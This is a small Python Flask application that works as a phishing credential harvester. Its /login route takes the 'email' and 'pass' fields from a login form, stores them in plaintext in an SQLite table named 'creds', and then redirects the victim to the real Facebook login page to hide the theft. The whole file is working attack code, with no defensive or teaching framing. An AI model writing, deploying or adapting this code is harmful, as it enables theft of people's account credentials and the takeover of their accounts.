import os
from flask import Flask,render_template,request,redirect
app = Flask(__name__)
import sqlite3 
if 'database.db' not in os.listdir():
	conn = sqlite3.connect('database.db')
	print("Opened database successfully")
	conn.execute('CREATE TABLE creds (username TEXT, password TEXT)')
	print("Table created successfully")
	conn.close()
@app.route("/",methods=['POST','GET'])
def home():
    return render_template('index.html')
@app.route("/login",methods=['POST','GET'])
def login():
	fo = dict(request.form)
	usernm = fo['email']
	passwd = fo['pass']
	#print(fo)
	with sqlite3.connect("database.db") as con:
            cur = con.cursor()
            cur.execute("INSERT INTO creds (username,password) VALUES (?,?)",(usernm,passwd) )
            con.commit()
            print("Record successfully added")
	return redirect("https://www.facebook.com/login.php")